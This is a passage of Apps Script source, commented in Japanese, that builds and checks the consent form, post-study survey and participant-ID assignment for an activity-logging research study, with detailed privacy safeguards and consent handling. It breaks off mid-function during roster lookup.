    "複数の端末で使うときに、記録を端末ごとに分けるためだけに使います（機体番号・ホスト名などは使いません）\n" +
    "・（macOS のみ）パスワード入力中だった区間の印（★ 中身は一切取得しません）\n" +
    "・上の記録から計算した「作業の状態」の推定値\n\n" +
    "▼ ⚠️ 記録しないもの\n" +
    "・★★★ どの文字を打ったか（本文）／画面の内容・スクリーンショット\n" +
    "・★★★ アプリの名前・ウィンドウのタイトル・URL・ファイル名・プロジェクト名\n" +
    "・★★★ マウスの位置・軌跡・画面の解像度・モニタの配置／クリップボードの中身\n" +
    "・端末を特定できる情報（機体番号・ホスト名など）／位置情報／音声・映像\n\n" +
    "▼ ⚠️★★★ 隠さずに書きます\n" +
    "上の記録から「その時間、席にいて操作していたか」の連続した記録ができます。\n" +
    "★ 何をしていたかは分かりませんが、**いつ作業していて、いつ離れていたかの時間の並び**は残ります。\n" +
    "→ ★ だからこそ、下の「止める・消す」を用意しています。\n\n" +
    "▼ ★★★ あなたがいつでもできること（3 点）\n" +
    "1. **記録中だと分かる** … 記録している間はずっと画面に印が出ます。\n" +
    "   ⚠️ 印が出ていないときは記録していません。\n" +
    "2. **すぐ止める** … ワンクリックで一時停止できます。★ 理由を聞きません。\n" +
    "3. **あとから「この時間帯を消して」と言える** … 時間帯を指定して削除できます。\n" +
    "   ★ 理由を説明する必要はありません。\n\n" +
    "▼ 記録の保管\n" +
    "・記録はまず、あなたの端末の中だけに、暗号化された場所へ保存します。\n" +
    "  ⚠️ クラウド同期フォルダ（OneDrive 等）には置きません。\n" +
    "・⚠️★★★ そのうえで、1 日ごとにひとまとまりにした記録を、**48 時間おいてから**" +
    "暗号化して自動的に研究者へ送ります。\n" +
    "  ★ なぜ 48 時間おくのか: **送る前なら、あなたが「この時間帯を消して」と言えば" +
    "端末の上で消えるから**です。\n" +
    "  ⚠️ 送られたあとは、研究者にお申し出ください。研究者側で削除し、削除したことを記録に残します。\n" +
    "  ★ どちらの場合も、理由を説明する必要はありません。\n" +
    "・記録は P0xx のような記号で管理し、氏名・連絡先とは別に保管します。\n" +
    "・★ 保管の上限: 暗号化した記録は " +
    O1_RETENTION_ENCRYPTED +
    "、研究者が復号したものは " +
    O1_RETENTION_PLAINTEXT +
    "、個人が特定できない集計値は " +
    O1_RETENTION_METRICS +
    " で削除します。\n\n" +
    "▼ 結果の公表と、記録の公開について\n" +
    "・研究の結果は論文などで公表します。公表するのは、記録から計算した数値と、その計算のプログラムです。" +
    "お名前・連絡先・記録した日付と時刻は入れません。\n" +
    "  参加者が少ないため、1 人ずつの数値を P0xx のような記号で示すことがあります。\n" +
    "  論文に載せた数値は、上の保管の上限が来ても消えません（削除するのは研究者の手元の記録と集計値です）。" +
    "公表する前であれば、削除のお申し出で公表の対象から外します。" +
    "公表した後は、公表済みの数値からあなたの分だけを取り除くことはできません。\n" +
    "・将来、加工した記録を研究成果として公開する可能性があります。" +
    "その場合は、あらためてお尋ねし、同意をいただけた記録だけを公開します。\n" +
    "  お尋ねに答えなくても、断っても、不利益はありません。答えがない場合は公開しません。\n\n" +
    "▼ お問い合わせ・削除のお申し出\n" +
    "研究責任者: " +
    O1_CONTACT_NAME +
    "（" +
    O1_AFFILIATION +
    "）\n" +
    "連絡先: " +
    O1_CONTACT_EMAIL +
    "\n" +
    "★ 記録の削除をご希望のときも上へお申し出ください。⚠️ 理由をお聞きすることはありません。"
  );
}

/**
 * ★ 同意項目。⚠️ **`consent-draft-o1.md` の約束と 1 対 1 で対応させる。**
 *   ★ 約束を足したのに同意項目を足さない、が最も危ない (被験者が同意していない約束が
 *     文書にだけ載る)。⚠️ 逆に、ここにある項目は**必ず本文で説明されていること**。
 */
function o1ConsentItemTitles_() {
  return [
    "上の説明を読み、質問する機会がありました。",
    "★ ふだんの作業のあいだ、キーやマウスの操作のしかたが「" +
      O1_PERIOD_TEXT +
      "」にわたって記録されることを理解しました。",
    "★★★ 文章の中身・画面の内容・アプリ名・URL・ファイル名は記録されないことを理解しました。",
    "★★★ この記録から「いつ作業していて、いつ離れていたか」の時間の並びが残ることの説明を受けました。",
    "★ 記録している間は画面に印が出ること、印が出ていないときは記録していないことを理解しました。",
    "★ ワンクリックでいつでも一時停止でき、理由を聞かれないことを理解しました。",
    "★★★ 1 日ごとにまとめた記録が、48 時間おいてから暗号化されて自動的に研究者へ送られることの説明を受けました。",
    "★★★ 送られる前なら端末の上で消せること、送られたあとは研究者に申し出れば削除され、" +
      "その削除が記録に残ることを理解しました。",
    "★ 保管の上限（暗号化した記録は " +
      O1_RETENTION_ENCRYPTED +
      "、復号したものは " +
      O1_RETENTION_PLAINTEXT +
      "、集計値は " +
      O1_RETENTION_METRICS +
      "）の説明を受けました。",
    // 2026-10-08 追加（研究者判断 2026-10-07 判断 1 と 2026-10-08）。本文の「結果の公表と、記録の公開について」に対応する。
    "研究の結果が論文などで公表され（1 人ずつの数値を記号で示すことを含む）、公表した数値は後から取り除けないこと、" +
      "加工した記録を公開する場合は、あらためて尋ねられ、同意した記録だけが公開されることの説明を受けました。",
    "★ 参加はいつでもやめられ、やめた時点でそれまでの記録の削除も求められることを理解しました。",
    "上記すべてに同意し、この記録と研究利用に同意します。",
  ];
}

function buildO1ConsentForm() {
  var form = o1OpenFixed_(o1Config_().consentFormId, "FORM_ID_O1_CONSENT");
  if (O1_CLEAR_EXISTING) {
    o1AssertSafeToRebuild_(form, "O1-C 説明・同意");
    o1ClearForm_(form);
  }

  form.setTitle(o1ConsentFormTitle_());
  form.setDescription(o1ConsentFormDescription_());
  form.setCollectEmail(false); // ★ 下の設問で明示的に取る (何を取るかを本人に見せる)
  form.setShowLinkToRespondAgain(false);
  form.setConfirmationMessage(
    "ご回答ありがとうございます。\n" +
      "参加者ID とアプリの入手方法を、ご記入のメールアドレスへお送りします。\n" +
      "★ 届かない場合は " +
      O1_CONTACT_EMAIL +
      " へお知らせください。"
  );

  o1AddSectionHeader_(
    form,
    "同意の確認",
    "以下のすべてに同意いただける場合のみ、参加をお願いします。\n" +
      "★ 1 つでも同意いただけない項目があれば、このまま閉じてください（不利益はありません）。"
  );

  o1ConsentItemTitles_().forEach(function (title) {
    var q = form.addCheckboxItem();
    q.setTitle(title);
    q.setChoices([q.createChoice("同意する / 理解した")]);
    q.setRequired(true);
  });

  // ⚠️★★★ §6 の「宣言ブロック」「画面録画」は **このフォームでは同意を取らない。**
  //   ★ `consent-draft-o1.md` §6 が逐語「お願いする場合は、必ず個別に説明して同意をいただきます」
  //     と約束している。★ ここでまとめて取ると、その約束が破れる。
  //   → ★ **お知らせだけ**を置く (同意項目にしない)。
  o1AddSectionHeader_(
    form,
    "★ 一部の方へのお願いについて（★ ここでは同意を取りません）",
    "図面 / 動画編集 / スライドなど、文字をあまり打たない作業をされる方には、\n" +
      "別の測定（宣言ブロック）や、確認用のごく短い画面録画を、後日あらためてお願いすることがあります。\n" +
      "⚠️ ★ その場合は**必ず個別に説明し、あらためて同意をいただきます**。断っても不利益はありません。\n" +
      "★ このフォームでその同意を取ることはありません。"
  );

  o1AddSectionHeader_(
    form,
    O1_REGISTRATION_HEADER,
    "★ 参加者ID をお送りするため、また削除のお申し出を受け付けるために必要です。\n" +
      "⚠️ 記録（打鍵のログ）とは別に保管し、P0xx とのみ結び付けます。"
  );
  O1_REGISTRATION_TITLES.forEach(function (title) {
    o1AddRegistrationItem_(form, title);
  });

  o1RecordFormUrl_("O1_CONSENT", form, "O1-C 説明・同意（★ 同意の正本）");
  Logger.log("O1-C 説明・同意を構築した: " + form.getPublishedUrl());
}

/**
 * O1-C の登録用の設問（参加者ID・お名前・メールアドレス・パソコンの種類）を 1 つ末尾に足す。
 * 構築（`buildO1ConsentForm`）と修復（`repairO1ConsentRegistrationItems`）の両方がこれを使う。
 * 定義を 1 か所に置くので、修復で足した設問は構築したものと同じになる。
 */
function o1AddRegistrationItem_(form, title) {
  if (title === Q_O1_PID) {
    // ★ P-ID は Phase1 / G1 と共有する (同じ人＝同じ ID)。
    //   ⚠️ 必須にしない — 初参加の方は持っていない (その場合はこちらで採番する)。
    var pid = form.addTextItem();
    pid.setTitle(Q_O1_PID);
    pid.setHelpText(
      "以前 GSE の検証（Phase1 / G1）にご参加いただいた方は、そのときお伝えした " +
        "P から始まる記号（例: P015）をご記入ください。初めての方は空欄で構いません。"
    );
    // ⚠️★ 形式を**フォームでも**検証する（Codex 指摘・2026-08-28）。
    //   ★ 打ち間違いは提出前に本人が直せるのがいちばん安い。
    //   ⚠️ 必須ではないので**空欄は通る**（★ 初参加の人を止めない）。
    //   ★ 後段（`onO1ConsentSubmit`）でも同じ規則で検証する（★ 二重に持つ）。
    pid.setValidation(
      FormApp.createTextValidation().requireTextMatchesPattern("^[PpＰｐ]?[0-9０-９]*$").build()
    );
    return pid;
  }
  if (title === Q_O1_NAME) {
    return form.addTextItem().setTitle(Q_O1_NAME).setRequired(true);
  }
  if (title === Q_O1_EMAIL) {
    var mail = form.addTextItem();
    mail.setTitle(Q_O1_EMAIL);
    mail.setRequired(true);
    mail.setValidation(FormApp.createTextValidation().requireTextMatchesPattern(".+@.+").build());
    return mail;
  }
  if (title === Q_O1_OS) {
    // ★ どちらの配布物を送るかがこれで決まる (`O1_実施用_Windows.zip` / `O1_実施用_macOS.zip`)。
    //   ⚠️ 端末を特定する情報ではない (機種名・ホスト名は聞かない)。
    var os = form.addMultipleChoiceItem();
    os.setTitle(Q_O1_OS);
    os.setHelpText("★ お送りするアプリが違うためお聞きします。⚠️ 機種名やホスト名はお聞きしません。");
    os.setChoices(
      O1_OS_CHOICES.map(function (c) {
        return os.createChoice(c);
      })
    );
    os.setRequired(true);
    return os;
  }
  throw new Error("o1AddRegistrationItem_: 登録用の設問ではありません: " + title);
}

/**
 * ★ 回答を保ったまま同意項目を**足す**（削除しない）。
 * ⚠️ `setupO1Forms()` は回答があると止まるので、運用開始後の更新はこちらを使う。
 * ★ 説明文とタイトルは上書きする（文面の訂正はこれで届く）。
 */
function migrateO1ConsentForm() {
  var form = o1OpenFixed_(o1Config_().consentFormId, "FORM_ID_O1_CONSENT");
  form.setTitle(o1ConsentFormTitle_());
  form.setDescription(o1ConsentFormDescription_());

  var existing = {};
  form.getItems().forEach(function (it) {
    existing[it.getTitle()] = true;
  });

  var added = 0;
  o1ConsentItemTitles_().forEach(function (title) {
    if (existing[title]) return;
    var q = form.addCheckboxItem();
    q.setTitle(title);
    q.setChoices([q.createChoice("同意する / 理解した")]);
    q.setRequired(true);
    added++;
    Logger.log("➕ 同意項目を追加: " + title);
  });

  // ⚠️★★ 追加した項目は**末尾**に付く。★ 既に回答した人はその項目に同意していない。
  //   → 黙って進めない。研究者に判断させる。
  if (added) {
    Logger.log(
      "⚠️★★★ " +
        added +
        " 件の同意項目を追加しました。\n" +
        "  ★ **既に回答した方は、この項目に同意していません。**\n" +
        "  ⚠️ 追加が実質的な内容変更なら、既存の参加者に**あらためて同意を取り直す**こと。"
    );
  }
  // 同意項目のタイトルだけを見て「一致しています」と言わない（2026-10-03 に、登録用の 3 設問が
  // 無いフォームでこう出していた）。言う前に、登録用の設問も含めて実物を照合する。
  var problems = o1ConsentFormShapeProblems_(form);
  if (problems.length) {
    Logger.log(
      (added ? "" : "追加する同意項目はありません。") +
        "ただし、フォームはコードと一致していません（" +
        problems.length +
        " 件）:\n  - " +
        problems.join("\n  - ") +
        "\n登録用の設問が欠けているだけなら repairO1ConsentRegistrationItems() で足せます。" +
        "\n並びの崩れ（末尾に足した同意項目が登録用の設問より後ろにある等）は、編集画面で直してください。"
    );
  } else if (!added) {
    Logger.log("✅ 追加する同意項目はありません（フォームはコードと一致しています）");
  }
  return added;
}

/**
 * O1-C の実物の設問を、コードの期待と照合する。フォームを変更しない。
 * 期待: 見出しを除いて、同意項目（チェックボックス・必須）がすべて、続いて登録用の 4 設問
 *   （`O1_REGISTRATION_TITLES` の順。参加者ID だけ必須でない）。
 * 戻り値: 問題の文の配列（一致していれば空）。
 * 入力欄の検査（メールの「@ を含む」など）は Apps Script から読めないので見ていない。
 */
function o1ConsentFormShapeProblems_(form) {
  var expected = [];
  o1ConsentItemTitles_().forEach(function (t) {
    expected.push({ title: t, type: FormApp.ItemType.CHECKBOX, required: true });
  });
  expected.push({ title: Q_O1_PID, type: FormApp.ItemType.TEXT, required: false });
  expected.push({ title: Q_O1_NAME, type: FormApp.ItemType.TEXT, required: true });
  expected.push({ title: Q_O1_EMAIL, type: FormApp.ItemType.TEXT, required: true });
  expected.push({
    title: Q_O1_OS,
    type: FormApp.ItemType.MULTIPLE_CHOICE,
    required: true,
    choices: O1_OS_CHOICES,
  });

  var items = form.getItems().filter(function (it) {
    return it.getType() !== FormApp.ItemType.SECTION_HEADER;
  });
  var titles = items.map(function (it) {
    return it.getTitle();
  });
  var problems = [];
  var lastPos = -1;
  var lastTitle = "";
  expected.forEach(function (e) {
    var pos = titles.indexOf(e.title);
    if (pos < 0) {
      problems.push("欠けている: " + e.title);
      return;
    }
    var it = items[pos];
    var type = it.getType();
    if (type !== e.type) {
      problems.push("種類が違う: " + e.title + "（実物 " + type + " / 期待 " + e.type + "）");
    } else {
      var req = o1ItemIsRequired_(it, type);
      if (req !== e.required) {
        problems.push("必須の有無が違う: " + e.title + "（実物 " + req + " / 期待 " + e.required + "）");
      }
      // どちらの配布物を送るかは選択肢の文字列で決まるので、選択肢も照合する。
      if (e.choices) {
        var got = it
          .asMultipleChoiceItem()
          .getChoices()
          .map(function (c) {
            return c.getValue();
          });
        if (got.join("\n") !== e.choices.join("\n")) {
          problems.push(
            "選択肢が違う: " + e.title + "（実物 " + got.join(" / ") + " / 期待 " + e.choices.join(" / ") + "）"
          );
        }
      }
    }
    if (pos < lastPos) {
      problems.push("並びが違う: " + e.title + " が " + lastTitle + " より前にある");
    } else {
      lastPos = pos;
      lastTitle = e.title;
    }
  });
  // タイトルが constructor などでも誤らないよう、プロトタイプの無い辞書を使う（Codex 指摘・2026-10-08）。
  var known = Object.create(null);
  expected.forEach(function (e) {
    known[e.title] = true;
  });
  var seen = Object.create(null);
  titles.forEach(function (t) {
    if (!known[t]) problems.push("コードに無い設問: " + t);
    if (seen[t] === 1) problems.push("同じタイトルの設問が 2 つ以上ある: " + t);
    seen[t] = (seen[t] || 0) + 1;
  });
  return problems;
}

/** 設問が必須か。`Item` には isRequired が無いので、種類ごとの型に変えて読む。 */
function o1ItemIsRequired_(item, type) {
  if (type === FormApp.ItemType.TEXT) return item.asTextItem().isRequired();
  if (type === FormApp.ItemType.CHECKBOX) return item.asCheckboxItem().isRequired();
  if (type === FormApp.ItemType.MULTIPLE_CHOICE) return item.asMultipleChoiceItem().isRequired();
  return null;
}

/**
 * 読み取り専用。O1-C の実物がコードの期待と一致しているかをログに出す。フォームを変更しない。
 * 一致していれば true。
 */
function checkO1ConsentFormShape() {
  var form = o1OpenFixed_(o1Config_().consentFormId, "FORM_ID_O1_CONSENT");
  var problems = o1ConsentFormShapeProblems_(form);
  if (!problems.length) {
    Logger.log("✅ O1-C の設問はコードと一致しています（回答 " + form.getResponses().length + " 件）");
    return true;
  }
  Logger.log(
    "❌ O1-C の設問がコードと一致していません（" +
      problems.length +
      " 件・回答 " +
      form.getResponses().length +
      " 件）:\n  - " +
      problems.join("\n  - ")
  );
  return false;
}

/**
 * 回答を残したまま、O1-C に欠けている登録用の設問（参加者ID・お名前・メールアドレス・
 * パソコンの種類）を、構築と同じ定義で末尾に足す。設問も回答も消さない。2 回目は何も足さない。
 *
 * 2026-10-08 に、実物が「参加者ID」で終わり、後ろの 3 つが無かったので足した。
 * Apps Script の追加は末尾にしか付かないので、足した後にコードと一致する形のときだけ足す:
 *   - 今のフォームの最後が、残っている登録用の最後の設問（1 つも無ければ「ご記名」の見出し）
 *   - 照合で、登録用の設問の欠け以外の問題が無い（並びの崩れはここで止まる）
 * そうでなければ足さずに止まる（並べ替えや直しが要る形は人が見る）。
 * 戻り値: 足した数。
 */
function repairO1ConsentRegistrationItems() {
  var form = o1OpenFixed_(o1Config_().consentFormId, "FORM_ID_O1_CONSENT");
  var all = form.getItems();
  var present = Object.create(null);
  all.forEach(function (it) {
    present[it.getTitle()] = true;
  });

  var missing = O1_REGISTRATION_TITLES.filter(function (t) {
    return !present[t];
  });
  if (!missing.length) {
    Logger.log(
      "✅ 登録用の設問は 4 つとも揃っています。何も足しませんでした。" +
        "フォーム全体の照合は checkO1ConsentFormShape() で行ってください。"
    );
    return 0;
  }

  // 最初に欠けた設問の直前に来るべきもの（並びでそれより前の登録用の設問の最後。無ければ見出し）が、
  // 今のフォームの最後であること。並びで後ろの設問が残っていれば、それはこれより前にあるはずなので
  // 下の照合が「並びが違う」で止める。照合は見出しを見ないので、登録用の設問の後ろに見出しが付いた形は
  // ここでしか止まらない。
  var kept = O1_REGISTRATION_TITLES.slice(0, O1_REGISTRATION_TITLES.indexOf(missing[0]));
  var wantLast = kept.length ? kept[kept.length - 1] : O1_REGISTRATION_HEADER;
  var lastItem = all.length ? all[all.length - 1] : null;
  var lastTitle = lastItem ? lastItem.getTitle() : "";
  // タイトルだけでなく種類も見る（登録用の設問と同じ名前の見出しで通り抜けないように。Codex 指摘・2026-10-08）。
  var lastIsHeader = !!lastItem && lastItem.getType() === FormApp.ItemType.SECTION_HEADER;
  if (lastTitle !== wantLast || lastIsHeader !== !kept.length) {
    throw new Error(
      "⛔ フォームの最後の設問が「" +
        lastTitle +
        "」で、「" +
        wantLast +
        "」ではありません。末尾に足すと順序が壊れるので止めました。\n" +
        "  checkO1ConsentFormShape() で形を確かめてください。"
    );
  }

  // 欠け以外の問題（並び・種類・必須・選択肢・重複・同意項目の欠け）が足す前からあるなら、
  // 足しても一致しないので足さずに人に返す。
  var missingMsg = Object.create(null);
  missing.forEach(function (t) {
    missingMsg["欠けている: " + t] = true;
  });
  var other = o1ConsentFormShapeProblems_(form).filter(function (p) {
    return !missingMsg[p];
  });
  if (other.length) {
    throw new Error(
      "⛔ 登録用の設問の欠けのほかにも、コードと違うところがあります。足さずに止めました:\n  - " +
        other.join("\n  - ") +
        "\n  編集画面で直してから、もう一度実行してください。"
    );
  }

  missing.forEach(function (t) {
    o1AddRegistrationItem_(form, t);
    Logger.log("➕ 登録用の設問を追加: " + t);
  });
  var n = form.getResponses().length;
  Logger.log(
    missing.length +
      " 件の登録用の設問を足しました。" +
      (n ? "既にある回答 " + n + " 件には、足した設問の答えがありません。" : "")
  );
  var problems = o1ConsentFormShapeProblems_(form);
  Logger.log(
    problems.length
      ? "❌ 足した後もコードと一致していません:\n  - " + problems.join("\n  - ")
      : "✅ 足した後の O1-C はコードと一致しています。"
  );
  return missing.length;
}

// ============================================================
// O1-S 終了後アンケート
// ============================================================
// ★ 入れるもの (研究者判断 2026-08-28): **受容性・負担 (ADR-014 D8)** ＋ **宣言 UI の使い勝手**。
//
// ⚠️★★★ **「一時停止・削除の理由」を聞かない。**
//   ★ 同意文書 §4 が逐語「理由を聞きません」「理由を説明する必要はありません」と約束しており、
//     `RecordingControls.tsx` も理由の入力欄を置いていない。
//   ⚠️ 事後アンケートで聞けば、**約束は形の上で守られていても実質が破れる**
//     (「あとで理由を聞かれる」なら、被験者は止めにくくなる)。
//   → ★ 回数だけを聞き、⚠️ **理由を尋ねる設問を置かない**。
//     `o1_form_builder_test.cjs` がこれを機械で検査している。
function buildO1PostSurveyForm() {
  var form = o1OpenFixed_(o1Config_().surveyFormId, "FORM_ID_O1_SURVEY");
  if (O1_CLEAR_EXISTING) {
    o1AssertSafeToRebuild_(form, "O1-S 終了後アンケート");
    o1ClearForm_(form);
  }

  form.setTitle("GSE O1 — 終了後アンケート");
  form.setDescription(
    "ご協力ありがとうございました。最後にいくつか伺います（5 分ほど）。\n\n" +
      "★ この回答は**記録の解析には使いません**。★ 進め方と道具の改善のために伺うものです。\n" +
      "★ 正解はありません。答えたくない設問は飛ばして構いません。\n\n" +
      "⚠️ 「一時停止」や「削除」を使われた**理由はお聞きしません**（お約束のとおりです）。"
  );
  form.setCollectEmail(false); // ★ PII を取らない (参加者 ID のみ)
  form.setShowLinkToRespondAgain(false);
  form.setConfirmationMessage("ご協力ありがとうございました。");

  var sid = form.addTextItem();
  sid.setTitle(Q_O1_SUBJECT_ID);
  sid.setRequired(true);
  sid.setValidation(FormApp.createTextValidation().requireTextMatchesPattern("P[0-9]+").build());

  // --- 1. 受容性・負担 (ADR-014 D8) ------------------------------------------
  o1AddSectionHeader_(
    form,
    "1. 記録されていることについて",
    "★ 率直なところを教えてください。⚠️ 否定的な回答で不利益になることはありません。"
  );

  var burden = form.addMultipleChoiceItem();
  burden.setTitle(Q_O1_S_BURDEN);
  burden.setChoices([
    burden.createChoice("まったく気にならなかった"),
    burden.createChoice("ときどき気になった"),
    burden.createChoice("しばしば気になった"),
    burden.createChoice("ずっと気になっていた"),
  ]);
  burden.setRequired(true);

  form.addParagraphTextItem().setTitle("気になった場面があれば教えてください（任意）。");

  // ★★ reactivity —— **これが D8 の中心**である。
  //   ⚠️ 「気にならなかった」でも作業を変えていることがあるので、別に聞く。
  var reactivity = form.addMultipleChoiceItem();
  reactivity.setTitle("記録されていることで、ふだんの作業のしかたを変えましたか。");
  reactivity.setChoices([
    reactivity.createChoice("変えなかった"),
    reactivity.createChoice("最初の数日だけ少し変えた"),
    reactivity.createChoice("ときどき変えた"),
    reactivity.createChoice("ずっと変えていた"),
  ]);
  reactivity.setRequired(true);
  form.addParagraphTextItem().setTitle("変えた場合、どのように変えましたか（任意）。");

  // ⚠️★★★ 2026-08-28 の訂正 (security-checker 指摘)。
  //   ★ 旧文は「**記録を避けるために**、アプリを止めたり別の端末を使ったりしましたか」だった。
  //   ⚠️ これは**一時停止の動機を尋ねている**ので、同意文書 §4 の逐語「理由を聞きません」に反する
  //     （★ 本ファイルが上で自ら禁じている当のもの。⚠️ 検査は「理由」の語しか見ておらず素通りした）。
  //   → ★ **行動だけ**を聞く形に直した。⚠️ 「なぜ」を含む語を入れないこと。
  var otherDevice = form.addMultipleChoiceItem();
  otherDevice.setTitle("この期間、アプリを入れていない別の端末で作業した日はありましたか。");
  otherDevice.setHelpText(
    "★ あっても全く問題ありません。⚠️ 記録の抜けを正しく読むために伺っています。" +
      "★ 理由はお聞きしません。"
  );
  otherDevice.setChoices([
    otherDevice.createChoice("なかった"),
    otherDevice.createChoice("1〜2 日あった"),
    otherDevice.createChoice("何日もあった"),
  ]);

  // ⚠️★★★ **回数だけ**。理由は聞かない (上のコメント参照)。
  var pause = form.addMultipleChoiceItem();
  pause.setTitle(Q_O1_S_PAUSE_USED);
  pause.setHelpText("⚠️ ★ 使われた**理由はお聞きしません**。回数の目安だけ教えてください。");
  pause.setChoices([
    pause.createChoice("使わなかった"),
    pause.createChoice("1〜2 回使った"),
    pause.createChoice("週に 1 回程度使った"),
    pause.createChoice("ほぼ毎日使った"),
    pause.createChoice("★ 機能があることを知らなかった"),
  ]);
  pause.setRequired(true);

  var del = form.addMultipleChoiceItem();
  del.setTitle("「この時間帯の記録を消す」を使いましたか。");
  del.setHelpText("⚠️ ★ こちらも**理由はお聞きしません**。");
  del.setChoices([
    del.createChoice("使わなかった"),
    del.createChoice("使った"),
    del.createChoice("★ 機能があることを知らなかった"),
    del.createChoice("使おうとしたが、やり方が分からなかった"),
  ]);
  del.setRequired(true);

  var quit = form.addMultipleChoiceItem();
  quit.setTitle("途中でやめようと思ったことはありましたか。");
  quit.setChoices([
    quit.createChoice("なかった"),
    quit.createChoice("少し思った"),
    quit.createChoice("かなり思った"),
  ]);

  var again = form.addMultipleChoiceItem();
  again.setTitle("同じ記録を、この先も続けられそうですか。");
  again.setChoices([
    again.createChoice("続けられる"),
    again.createChoice("短い期間なら続けられる"),
    again.createChoice("続けたくない"),
  ]);
  again.setRequired(true);

  // --- 2. 宣言 UI の使い勝手 ---------------------------------------------------
  o1AddSectionHeader_(
    form,
    "2. 「作業の種類」の選択について",
    "画面のすみに出ていた「記録中 · 作業の種類: ○○」の表示についてです。\n" +
      "★ 選び忘れても記録は続いていますので、忘れたこと自体は問題ありません。"
  );

  var repick = form.addMultipleChoiceItem();
  repick.setTitle(Q_O1_S_DECL_REPICK);
  repick.setChoices([
    repick.createChoice("作業が変わるたびに選び直した"),
    repick.createChoice("だいたい選び直した"),
    repick.createChoice("ときどき選び直した"),
    repick.createChoice("最初に選んだきりだった"),
    repick.createChoice("一度も選ばなかった"),
  ]);
  repick.setRequired(true);

  var fit = form.addMultipleChoiceItem();
  fit.setTitle("5 つの選択肢は、ご自身の作業に合っていましたか。");
  fit.setHelpText("論述 / 通信文 / デザイン・映像・制作作業 / vibe coding / その他・細切れの作業");
  fit.setChoices([
    fit.createChoice("だいたい合っていた"),
    fit.createChoice("合わない作業が半分くらいあった"),
    fit.createChoice("ほとんど合わなかった"),
  ]);
  fit.setRequired(true);

  form.addParagraphTextItem().setTitle("★ 足りないと感じた選択肢があれば教えてください（任意）。");

  var mark = form.addMultipleChoiceItem();
  mark.setTitle("「記録中」の印は、いつも見えていましたか。");
  mark.setHelpText("⚠️ 見えていなかった場面があれば、下の欄で教えてください（重要です）。");
  mark.setChoices([
    mark.createChoice("いつも見えていた"),
    mark.createChoice("見えないことがあった"),
    mark.createChoice("印があることを意識していなかった"),
  ]);
  mark.setRequired(true);
  form.addParagraphTextItem().setTitle("見えないことがあった場合、どんな場面でしたか（任意）。");

  // --- 3. 自由記述 -------------------------------------------------------------
  o1AddSectionHeader_(form, "3. 最後に", "");
  form
    .addParagraphTextItem()
    .setTitle("お気づきの点・言っておきたいことがあれば、何でも教えてください（任意）。");

  o1RecordFormUrl_("O1_SURVEY", form, "O1-S 終了後アンケート（★ 解析には使わない）");
  Logger.log("O1-S 終了後アンケートを構築した: " + form.getPublishedUrl());
}

// ============================================================
// P-ID の採番 (★ Phase1 のロスターに対して行う)
// ============================================================
// ★ Phase1 の nextParticipantId_ / G1 の g1NextParticipantId_ と同じ規則
//   (P + 3 桁ゼロ埋め・既存の最大値 + 1)。
// ⚠️ ★ 実装が 3 つになるので、**規則を変えるときは 3 つとも**直す (Form_Phase1 側が正)。
//
// ⚠️★★★ **1 か所だけ意図的に G1 と違う。** G1 / Phase1 は `last > 1` のときしか
//   ロスターを読まない。★ 規則そのものは同じだが、⚠️ **行が 1 行しか無いロスターで
//   既存の P-ID を見落とす**: 例えば `P001` だけが入っているシートに対して
//   `last > 1` は偽になり、`max = 0` のまま **`P001` を返して衝突する**。
//   ★ ここでは `last >= 1` で読む。
//   ⚠️ 見出し行があっても `^P(\d+)$` に一致しないので無視され、
//     ★ 行が 2 行以上あるとき (＝現行ロスター) の結果は **G1 と 1 バイトも変わらない**。
//   (2026-08-28 に `o1_form_builder_test.cjs` §4 / §5 が実測して見つけた)

function o1NextParticipantId_(sheet) {
  var max = 0;
  var last = sheet.getLastRow();
  var values = last >= 1 ? sheet.getRange(1, 1, last, 1).getValues() : [];
  for (var i = 0; i < values.length; i++) {
    var m = String(values[i][0]).match(/^P(\d+)$/);
    if (m) {
      var n = parseInt(m[1], 10);
      if (n > max) max = n;
    }
  }
  var next = max + 1;
  return "P" + (next < 1000 ? ("000" + next).slice(-3) : String(next));
}

/**
 * Phase1 ロスターを引く。見つかれば `{pid, row}`、⚠️ 取り違えなら `{conflict: true, ...}`。
 *
 * ⚠️★★★ **申告された P-ID をそのまま信用しない** (security-checker 指摘・2026-08-28)。
 *
 *   ★ O1-C の「参加者ID（お持ちの方のみ）」は**自由記入で任意**であり、フォーム URL は
 *     被験者に配られる。→ ⚠️ 打ち間違い (`P015` → `P016`) でも、第三者の申告でも、
 *     **他人の P-ID を名乗れてしまう**。
 *   ⚠️ 旧実装は P-ID 一致だけで既存扱いにしていたので、その場合
 *     **B さんの数週間ぶんの常時打鍵ログが A さんの P-ID で提出される**。
 *     → ★ A さんから削除要求が来たとき、台帳 A-1 の `<pid>_o1day*` の削除は
 *       **B のデータも消すか、A のを消し残すか**のどちらかになり、
 *       ⚠️ 同意文書 §4-3 の「消えます」が**履行不能**になる。
 *
 * ★ したがって照合の順序を変えた:
 *   1. **メール一致を最優先**する (★ 受付メールを送る先と同じ = 自己整合的)
 *   2. メールで見つからないときだけ、申告された P-ID を見る
 *      - ★ その行のメールが**空**なら採用する (氏名だけ先に入れた行を埋める正当な経路)
 *      - ⚠️ **別のメールが入っていたら `conflict`** —— 発番も送信もせず、研究者に判断させる
 */
function o1FindInPhase1Roster_(sheet, opts) {
  var last = sheet.getLastRow();
  if (last < 1) return null;
  var rows = sheet.getRange(1, 1, last, 3).getValues(); // P-ID / 氏名 / メール
  var email = opts.email ? String(opts.email).trim().toLowerCase() : "";
  var pid = opts.pid ? String(opts.pid).trim().toUpperCase() : "";
  var i, rowPid, rowEmail;

  // 1. ★ メール一致（★ 最も強い手がかり。本人の受信箱と一致する）
  if (email) {
    // ⚠️★★★ **最初の一致で return しない**（2026-09-03・起票 T-26）。
    //   ★ 旧実装は先頭の一致行を**黙って採用**していた。⚠️ これは非対称だった ——
    //     ★ **P-ID の重複は検知して止める**のに（`o1RosterRowsForPid_` → 「同じ P-ID が N 行あります」）、
    //     ⚠️ **メールの重複は素通り**していた。
    //   ⚠️ ロスターは Phase1 / G1 / O1 で共用なので、同じ人が別経路で 2 行に入ることは起こる。
    //     ★ そのとき先頭行を採ると、⚠️ **どちらの P-ID を配ったかが提出のたびに変わりうる**
    //       （★ 行が並び替えられれば別の ID が出る）→ ⚠️ 1 人に 2 つの識別子ができる。
    //   → ★ **P-ID 重複と同じ扱い**にして、研究者に決めさせる。
    var emailHits = [];
    for (i = 0; i < rows.length; i++) {
      rowEmail = String(rows[i][2]).trim().toLowerCase();
      if (rowEmail && rowEmail === email) emailHits.push(i + 1);
    }
    if (emailHits.length > 1) {
      return {
